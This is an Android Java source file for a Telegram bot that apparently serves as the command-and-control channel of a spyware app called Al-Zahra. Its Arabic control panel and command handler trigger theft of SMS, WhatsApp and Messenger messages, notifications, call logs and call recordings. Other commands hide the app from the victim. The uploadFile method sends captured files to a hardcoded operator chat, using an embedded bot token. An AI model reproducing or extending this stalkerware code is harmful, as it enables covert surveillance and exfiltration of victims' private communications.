package com.alzahra.telegram;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TelegramArabicBot {
    private static final String TAG = "TelegramBot";
    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    private static final String CHAT_ID = "7344776596";
    private static final String API_BASE = "https://api.telegram.org/bot";
    
    private Context context;
    private Handler mainHandler;
    private ExecutorService executor;
    private volatile boolean running = false;
    private long lastUpdateId = 0;
    private ConcurrentLinkedQueue<String> commandQueue;
    private SharedPreferences prefs;

    public TelegramArabicBot(Context ctx) {
        this.context = ctx;
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newFixedThreadPool(3);
        this.commandQueue = new ConcurrentLinkedQueue<>();
        this.prefs = ctx.getSharedPreferences("bot_prefs", Context.MODE_PRIVATE);
    }

    public void start() {
        if (running) return;
        running = true;
        
        Log.d(TAG, "Bot starting...");
        sendControlPanel();
        startPolling();
    }

    public void stop() {
        running = false;
        executor.shutdown();
    }

    private void sendControlPanel() {
        String text = "🎛️ **لوحة تحكم Al-Zahra**\\n\\n" +
                "مرحباً بك في نظام المراقبة الذكي\\n" +
                "اختر الجهاز للتحكم:";
        
        String keyboard = "{\"inline_keyboard\":["
            + "[{\"text\":\"📱 الأجهزة المتصلة\",\"callback_data\":\"/devices\"}],"
            + "[{\"text\":\"📨 رسائل SMS\",\"callback_data\":\"/sms\"},{\"text\":\"🔔 الإشعارات\",\"callback_data\":\"/notifications\"}],"
            + "[{\"text\":\"💬 واتساب\",\"callback_data\":\"/whatsapp\"},{\"text\":\"📧 ماسنجر\",\"callback_data\":\"/messenger\"}],"
            + "[{\"text\":\"📞 سجل المكالمات\",\"callback_data\":\"/calls\"}],"
            + "[{\"text\":\"📱 معلومات الجهاز\",\"callback_data\":\"/info\"},{\"text\":\"🎙️ التسجيلات\",\"callback_data\":\"/recordings\"}],"
            + "[{\"text\":\"⚙️ الإعدادات\",\"callback_data\":\"/settings\"}],"
            + "[{\"text\":\"🔒 إخفاء التطبيق\",\"callback_data\":\"/hide\"},{\"text\":\"🔓 إظهار التطبيق\",\"callback_data\":\"/unhide\"}]"
            + "]}";
        
        sendMessageWithKeyboard(text, keyboard);
    }

    private void startPolling() {
        executor.execute(() -> {
            while (running) {
                try {
                    pollUpdates();
                    Thread.sleep(2000);
                } catch (Exception e) {
                    Log.e(TAG, "Polling error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ie) {}
                }
            }
        });
    }

    private void pollUpdates() {
        try {
            String url = API_BASE + BOT_TOKEN + "/getUpdates?offset=" + 
                        (lastUpdateId + 1) + "&limit=100";
            
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(10000);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            JSONObject json = new JSONObject(response.toString());
            if (!json.getBoolean("ok")) return;
            
            JSONArray results = json.getJSONArray("result");
            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                processUpdate(update);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error polling: " + e.getMessage());
        }
    }

    private void processUpdate(JSONObject update) {
        try {
            String command = null;
            
            // Check for message
            if (update.has("message") && update.getJSONObject("message").has("text")) {
                command = update.getJSONObject("message").getString("text")
                         .trim().toLowerCase();
            }
            // Check for callback (button press)
            else if (update.has("callback_query")) {
                command = update.getJSONObject("callback_query")
                         .getString("data").trim().toLowerCase();
            }
            
            if (command != null) {
                commandQueue.offer(command);
                handleCommand(command);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing update: " + e.getMessage());
        }
    }

    private void handleCommand(String cmd) {
        Log.d(TAG, "Handling command: " + cmd);
        
        switch (cmd) {
            case "/start":
            case "/help":
            case "مساعدة":
                sendControlPanel();
                break;
                
            case "/devices":
            case "الأجهزة":
                sendMessage("📱 **الأجهزة المتصلة**\\nجاري البحث عن الأجهزة...");
                commandQueue.offer("CMD_GET_DEVICES");
                break;
                
            case "/sms":
            case "sms":
                sendMessage("⏳ **جاري سحب رسائل SMS...**\\nيرجى الانتظار");
                commandQueue.offer("CMD_GET_SMS");
                break;
                
            case "/notifications":
            case "الإشعارات":
                sendMessage("⏳ **جاري سحب الإشعارات...**");
                commandQueue.offer("CMD_GET_NOTIFICATIONS");
                break;
                
            case "/whatsapp":
            case "واتساب":
                sendMessage("⏳ **جاري سحب رسائل واتساب...**\\nيبحث عن النسخ الاحتياطي");
                commandQueue.offer("CMD_GET_WHATSAPP");
                break;
                
            case "/messenger":
            case "ماسنجر":
                sendMessage("⏳ **جاري سحب رسائل ماسنجر...**");
                commandQueue.offer("CMD_GET_MESSENGER");
                break;
                
            case "/calls":
            case "المكالمات":
                sendMessage("⏳ **جاري سحب سجل المكالمات...**");
                commandQueue.offer("CMD_GET_CALLS");
                break;
                
            case "/info":
            case "معلومات":
                commandQueue.offer("CMD_GET_INFO");
                break;
                
            case "/recordings":
            case "التسجيلات":
                sendMessage("⏳ **جاري سحب تسجيلات المكالمات...**");
                commandQueue.offer("CMD_GET_RECORDINGS");
                break;
                
            case "/settings":
            case "إعدادات":
                sendSettingsPanel();
                break;
                
            case "/hide":
            case "إخفاء":
                sendMessage("🔒 **جاري إخفاء التطبيق...**");
                commandQueue.offer("CMD_HIDE_APP");
                break;
                
            case "/unhide":
            case "إظهار":
                sendMessage("🔓 **جاري إظهار التطبيق...**");
                commandQueue.offer("CMD_UNHIDE_APP");
                break;
                
            case "/record_on":
                sendMessage("🎙️ **تم تفعيل تسجيل المكالمات**");
                prefs.edit().putBoolean("call_recording", true).apply();
                break;
                
            case "/record_off":
                sendMessage("🎙️ **تم إيقاف تسجيل المكالمات**");
                prefs.edit().putBoolean("call_recording", false).apply();
                break;
                
            default:
                sendMessage("❓ **أمر غير معروف**\\nاكتب /help للمساعدة");
        }
    }

    private void sendSettingsPanel() {
        String text = "⚙️ **الإعدادات**\\n\\n"
            + "**تسجيل المكالمات:**\\n"
            + "/record_on - تفعيل\\n"
            + "/record_off - إيقاف\\n\\n"
            + "**التحكم:**\\n"
            + "/hide - إخفاء التطبيق\\n"
            + "/unhide - إظهار التطبيق\\n\\n"
            + "للعودة للوحة الرئيسية: /help";
        
        sendMessage(text);
    }

    public String getNextCommand() {
        return commandQueue.poll();
    }

    public void sendMessage(String text) {
        executor.execute(() -> {
            try {
                String url = API_BASE + BOT_TOKEN + "/sendMessage?chat_id=" + 
                            CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + 
                            "&parse_mode=Markdown";
                
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(10000);
                conn.getInputStream();
                
            } catch (Exception e) {
                Log.e(TAG, "Send message error: " + e.getMessage());
            }
        });
    }

    public void sendStatusMessage(String text) {
        sendMessage(text);
    }

    private void sendMessageWithKeyboard(String text, String keyboard) {
        executor.execute(() -> {
            try {
                String url = API_BASE + BOT_TOKEN + "/sendMessage";
                String params = "chat_id=" + CHAT_ID + 
                    "&text=" + URLEncoder.encode(text, "UTF-8") +
                    "&parse_mode=Markdown" +
                    "&reply_markup=" + URLEncoder.encode(keyboard, "UTF-8");
                
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.getOutputStream().write(params.getBytes("UTF-8"));
                conn.getInputStream();
                
            } catch (Exception e) {
                Log.e(TAG, "Send keyboard error: " + e.getMessage());
            }
        });
    }

    public boolean uploadFile(File file, String caption) {
        if (file == null || !file.exists()) {
            sendMessage("❌ الملف غير موجود");
            return false;
        }
        
        executor.execute(() -> {
            try {
                String boundary = "===" + System.currentTimeMillis() + "===";
                String lineEnd = "\r\n";
                
                HttpURLConnection conn = (HttpURLConnection) new URL(
                    API_BASE + BOT_TOKEN + "/sendDocument").openConnection();
                
                conn.setUseCaches(false);
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setRequestProperty("Content-Type", 
                    "multipart/form-data; boundary=" + boundary);
                
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                
                // Chat ID
                dos.writeBytes("--" + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + 
                    lineEnd + lineEnd + CHAT_ID + lineEnd);
                
                // Caption
                dos.writeBytes("--" + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + 
                    lineEnd + lineEnd + caption + lineEnd);
                
                // File
                dos.writeBytes("--" + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; " +
                    "filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                
                dos.writeBytes(lineEnd);
                dos.writeBytes("--" + boundary + "--" + lineEnd);
                
                dos.flush();
                dos.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode != 200) {
                    Log.e(TAG, "Upload failed: " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Upload error: " + e.getMessage());
            }
        });
        
        return true;
    }
}
